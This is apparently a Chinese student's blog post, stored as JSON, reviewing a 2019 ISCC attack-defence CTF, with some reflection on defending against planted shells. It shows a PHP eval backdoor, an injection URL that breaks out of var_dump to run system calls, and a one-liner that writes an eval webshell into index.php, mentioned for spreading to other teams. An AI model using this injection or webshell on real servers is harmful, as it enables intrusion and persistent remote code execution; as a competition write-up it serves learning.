{"title":"","slug":"ISCC线下赛回顾","date":"2019-07-23T09:10:56.857Z","updated":"2019-07-23T09:47:46.184Z","comments":true,"path":"api/articles/ISCC线下赛回顾.json","photos":[],"link":"","excerpt":"title: 2019 ISCC线下赛回顾 # 标题<br>date: 2019/7/23 17:17:17 # 时间<br>categories: 回顾# 分类Diary<br>tags: 回顾# 标签不比不知道自己跟大佬差距有多大！开局直接全场被大佬挂黑页，等着运维回复几个小时之后好不容易找到shell路径，shell又被其他大佬删了…真是菜哭了，一下午的比赛毫无作为…","covers":null,"content":"<hr>\n<p>title: 2019 ISCC线下赛回顾 # 标题<br>date: 2019/7/23 17:17:17 # 时间<br>categories: 回顾# 分类</p>\n<ul>\n<li>Diary<br>tags: 回顾# 标签</li>\n</ul>\n<p>不比不知道自己跟大佬差距有多大！开局直接全场被大佬挂黑页，等着运维回复几个小时之后好不容易找到shell路径，shell又被其他大佬删了…真是菜哭了，一下午的比赛毫无作为…</p>\n<a id=\"more\"></a>\n\n<h2 id=\"web1-私地渗透\"><a href=\"#web1-私地渗透\" class=\"headerlink\" title=\"web1 私地渗透\"></a>web1 私地渗透</h2><p>先是注册页面拿到shell路径，具体操作看SQL那篇吧。</p>\n<p>拿到路径之后访问之后是这样的</p>\n<pre><code>&lt;?php\nshow_source(__FILE__);\n$a=@$_REQUEST[&apos;a&apos;];\n@eval(&quot;var_dump($$a);&quot;);\n?&gt;</code></pre><p>先分析一下代码，主要几个函数</p>\n<ul>\n<li>show_source():查看文件源码</li>\n<li>eval():把字符串当做php代码执行</li>\n<li>var_dump():打印变量信息，返回值为null</li>\n</ul>\n<p>这里有明显的变量引用，我们可以控制$a的值来命令执行。</p>\n<h3 id=\"php中单引号与双引号的区别\"><a href=\"#php中单引号与双引号的区别\" class=\"headerlink\" title=\"php中单引号与双引号的区别\"></a>php中单引号与双引号的区别</h3><pre><code>&lt;?php\n$c=&quot;Luc1fer!&quot;;\necho &quot;My name is &quot;.$c.&quot;&lt;br&gt;&quot;;       //不加引号\necho &quot;My name is &quot;.&apos;$c&apos;.&quot;&lt;br&gt;&quot;;        //单引号\necho &quot;My name is &quot;.&quot;$c&quot;.&quot;&lt;br&gt;&quot;;        //双引号\necho &quot;My name is &quot;.&quot; &apos;$c&apos; &quot;.&quot;&lt;br&gt;&quot;;    //双引号+单引号\necho &quot;My name is &quot;.&apos; &quot;$c&quot; &apos;.&quot;&lt;br&gt;&quot;; //单引号+双引号\n?&gt;</code></pre><p>输出结果如下</p>\n<pre><code>My name is Luc1fer!                    //正常显示\nMy name is $c                        //单引号不被解析\nMy name is Luc1fer!                    //双引号内正常解析\nMy name is &apos;Luc1fer!&apos;                //双引号内正常解析\nMy name is &quot;$c&quot;                     //单引号内不被解析</code></pre><h3 id=\"php变量覆盖\"><a href=\"#php变量覆盖\" class=\"headerlink\" title=\"php变量覆盖\"></a>php变量覆盖</h3><p>测试代码：</p>\n<pre><code>&lt;?php\nshow_source(__FILE__);\n$b=&quot;Hello,my name is Luc1fer!&quot;;\n$a=@$_REQUEST[&apos;a&apos;];\necho $$a;\n?&gt;</code></pre><p>结果如下：</p>\n<pre><code> &lt;?php\nshow_source(__FILE__);\n$b=&quot;Hello,my name is Luc1fer!&quot;;\n$a=@$_REQUEST[&apos;a&apos;];\necho $$a;\n?&gt; Hello,my name is Luc1fer!</code></pre><p>代码的执行过程大概为  <code>get一个a--&gt;echo执行从右到左--&gt;echo $$a--&gt;echo $b--&gt;打印$b</code><br>我们可以通过?a=a=”hello”这样的方式来打印hello</p>\n<h3 id=\"利用过程\"><a href=\"#利用过程\" class=\"headerlink\" title=\"利用过程\"></a>利用过程</h3><p>对于var_dump()我们可以构造单引号使其闭合</p>\n<pre><code>&lt;?php\nshow_source(__FILE__);\n$a=@$_REQUEST[&apos;a&apos;];\n@eval(&quot;var_dump($$a);&quot;);\n?&gt;\n\nhttp://localhost/only-test-php.php?a=a=4);system(phpinfo()</code></pre><p>这样就可以打印phpinfo()信息了</p>\n<p>同样的我们可以cat flag了.</p>\n<h2 id=\"私地与高地\"><a href=\"#私地与高地\" class=\"headerlink\" title=\"私地与高地\"></a>私地与高地</h2><h3 id=\"主要问题\"><a href=\"#主要问题\" class=\"headerlink\" title=\"主要问题\"></a>主要问题</h3><p>等拿到私地权限之后就只剩40多分钟了，WINSCP死活连不上私地，没办法像往常一样down源码，上监控上waf，有点手忙脚乱，这边Xshell连上了，查看www目录发现全是马，打开几个手动注释了马，其他的都是readonly文件</p>\n<ol>\n<li>面对被写上的马，如果我是ctf权限，且文件readonly该怎么删掉这个马？</li>\n</ol>\n<p>赛后和老师讨论，老师说连不上WINSCP为什么不用wegt命令下源码？这个当时确实没想到，下次要注意。还有没上脚本的问题，同学指出可以直接用vim打开之后复制粘贴进去监控脚本，这个当时确实懵圈了，只在那傻傻的手工注释。</p>\n<p>2.面对不死马我该怎么去删掉这个不死马？</p>\n<p>比赛前准备的方法有kill进程、重启Apache、创建同名文件，这些在这次比赛中都没有真正实践到</p>\n<p>3.如何在拿到权限之后批量给别人传马？</p>\n<p>说实话我这个地方还是没懂，按理说应该是利用预留的后门然后执行写入命令</p>\n<pre><code>echo -e &quot;&lt;?php eval(\\@_POST[&apos;a&apos;]);?&gt;&quot; &gt; index.php | chomod 777 index.php</code></pre><p>但是怎么批量呢？用批量提交flag那个么？还带去问问师傅</p>\n","categories":[],"tags":[]}